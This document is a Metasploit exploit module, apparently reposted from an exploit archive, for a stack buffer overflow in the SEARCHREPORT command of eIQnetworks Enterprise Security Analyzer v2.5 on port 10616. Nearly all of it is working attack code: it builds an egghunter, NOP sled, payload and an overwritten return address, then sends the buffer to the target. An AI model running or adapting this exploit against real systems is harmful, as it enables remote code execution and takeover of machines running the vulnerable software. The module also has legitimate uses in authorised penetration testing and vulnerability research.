eIQnetworks ESA SEARCHREPORT Remote Overflow Exploit (meta)
===========================================================


##
# $Id: eiqnetworks_esa.rb 4529 2007-03-12 01:08:18Z hdm $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require &#039;msf/core&#039;

module Msf

class Exploits::Windows::Misc::Eiqnetworks_SEARCHREPORT < Msf::Exploit::Remote

	include Exploit::Remote::Tcp
	include Exploit::Remote::Egghunter

	def initialize(info = {})
		super(update_info(info,
			&#039;Name&#039;           => &#039;eIQNetworks ESA SEARCHREPORT Overflow&#039;,
			&#039;Description&#039;    => %q{
				This module exploits a stack overflow in eIQnetworks
				Enterprise Security Analyzer. During the processing of
				long arguments to the SEARCHREPORT command, a stack-based
				buffer overflow occurs. 
			},
			&#039;Author&#039;         => [ &#039;ri0t <ri0t[at]ri0tnet.net>&#039;,   ],
			&#039;Version&#039;        => &#039;$Revision: 4529 $&#039;,
			&#039;References&#039;     => 
				[
				],
			&#039;DefaultOptions&#039; =>
				{
					&#039;EXITFUNC&#039; => &#039;seh&#039;,
				},
			&#039;Payload&#039;        =>
				{
					&#039;Space&#039;    => 1962,
					&#039;BadChars&#039; => "\x00",
					&#039;ActiveTimeout&#039; => 15,
				},
			&#039;Platform&#039;       => &#039;win&#039;,
			
			&#039;Targets&#039;        =>
				[
					[&#039;EnterpriseSecurityAnalyzer v2.5 Universal&#039;, { &#039;Ret&#039; => 0x55322a6a, &#039;Offset&#039; => 1962 } ],  
				
				],

			&#039;Privileged&#039;     => false,

                        &#039;DisclosureDate&#039; => &#039;&#039;

                        ))

			register_options(
			[
				Opt::RPORT(10616)
			], self.class)
	end

	def exploit
		connect

		print_status("Trying target #{target.name}...")
	
		hunter = generate_egghunter()
		egg = hunter[1]
		filler =  make_nops(target[&#039;Offset&#039;] - payload.encoded.length)
		sploit =  "SEARCHREPORT&" + egg + egg + filler + payload.encoded + make_nops(12) + [target.ret].pack(&#039;V&#039;) + make_nops(12) + hunter[0] +  "&";
		puts sploit
		sock.put(sploit)
		handler
		disconnect	
	end

end
end



